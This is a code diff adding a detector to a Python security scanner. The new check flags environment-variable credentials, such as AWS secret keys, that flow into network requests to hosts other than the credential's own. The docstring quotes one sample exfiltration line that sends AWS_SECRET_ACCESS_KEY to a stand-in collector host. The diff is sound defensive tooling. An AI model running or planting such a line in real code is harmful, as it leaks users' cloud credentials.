@@ -514,6 +514,7 @@ class PythonAnalyzer:
         analyzer._downloaded_and_run(tree)
         analyzer._identity_sent(tree)
         analyzer._environment_sent(tree)
+        analyzer._secret_sent(tree)
         return analyzer._hits
 
     def _environment_handed_to_children(self, tree: ast.AST) -> set[int]:
@@ -1681,6 +1682,115 @@ class PythonAnalyzer:
                 for part in ast.walk(argument)
             ):
                 self._record(Capability.CREDENTIAL, node, f"environment sent: {resolved[0]}")
+
+    def _secret_sent(self, tree: ast.AST) -> None:
+        """One named credential, in a request to a host outside the credential's home.
+
+        `urlopen("https://collector.example/?k=" + os.environ["AWS_SECRET_ACCESS_KEY"])`, or the
+        value through a variable, or the URL through one. See `detect/secretflow.py` for what a
+        home is and why a host the file does not write down is never judged.
+        """
+        from cordon_scanner.detect.secretflow import SecretFlow
+
+        def credential_read(node: ast.AST) -> str | None:
+            name: ast.AST | None = None
+            if isinstance(node, ast.Subscript) and self._dotted(node.value) in (
+                "os.environ",
+                "os.environb",
+            ):
+                name = node.slice
+            elif isinstance(node, ast.Call):
+                dotted = self._dotted(node.func)
+                if (
+                    dotted
+                    in ("os.getenv", "os.environ.get", "os.environ.setdefault", "os.environ.pop")
+                    and node.args
+                ):
+                    name = node.args[0]
+            if isinstance(name, ast.Constant) and isinstance(name.value, str):
+                return name.value if SecretFlow.home_of(name.value) else None
+            return None
+
+        def url_literal(node: ast.AST) -> str | None:
+            if (
+                isinstance(node, ast.Constant)
+                and isinstance(node.value, str)
+                and "://" in node.value
+            ):
+                return node.value
+            if isinstance(node, ast.JoinedStr) and node.values:
+                first = node.values[0]
+                if (
+                    isinstance(first, ast.Constant)
+                    and isinstance(first.value, str)
+                    and "://" in first.value
+                ):
+                    return first.value
+            if isinstance(node, ast.BinOp) and isinstance(node.op, (ast.Add, ast.Mod)):
+                return url_literal(node.left)
+            if (
+                isinstance(node, ast.Call)
+                and isinstance(node.func, ast.Attribute)
+                and node.func.attr == "format"
+            ):
+                return url_literal(node.func.value)
+            return None
+
+        carrying: dict[str, str] = {}
+        urls: dict[str, str] = {}
+        for _ in range(3):
+            for node in ast.walk(tree):
+                if not isinstance(node, ast.Assign):
+                    continue
+                targets = [t.id for t in node.targets if isinstance(t, ast.Name)]
+                literal = url_literal(node.value)
+                if literal is not None:
+                    assigned = SecretFlow.host_of(literal)
+                    if assigned:
+                        urls.update(dict.fromkeys(targets, assigned))
+                for part in ast.walk(node.value):
+                    key = credential_read(part)
+                    if key is None and isinstance(part, ast.Name) and part.id in carrying:
+                        key = carrying[part.id]
+                    if key is not None:
+                        carrying.update(dict.fromkeys(targets, key))
+                        break
+        for node in ast.walk(tree):
+            if not isinstance(node, ast.Call):
+                continue
+            resolved = self._resolve_callee(node)
+            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
+                continue
+            arguments = [*node.args, *(k.value for k in node.keywords)]
+            keys: set[str] = set()
+            for argument in arguments:
+                for part in ast.walk(argument):
+                    key = credential_read(part)
+                    if key is None and isinstance(part, ast.Name) and part.id in carrying:
+                        key = carrying[part.id]
+                    if key is not None:
+                        keys.add(key)
+            if not keys:
+                continue
+            destination = (
+                node.args[0]
+                if node.args
+                else next(
+                    (k.value for k in node.keywords if k.arg in ("url", "uri", "host", "address")),
+                    None,
+                )
+            )
+            host: str | None = None
+            if destination is not None:
+                literal = url_literal(destination)
+                if literal is not None:
+                    host = SecretFlow.host_of(literal)
+                elif isinstance(destination, ast.Name):
+                    host = urls.get(destination.id)
+            for key in sorted(keys):
+                if SecretFlow.misdirected(key, host):
+                    self._record(Capability.CREDENTIAL, node, f"secret sent: {key} to {host}")
+                    break
 
     @staticmethod
     def _is_local_read(node: ast.AST) -> bool:
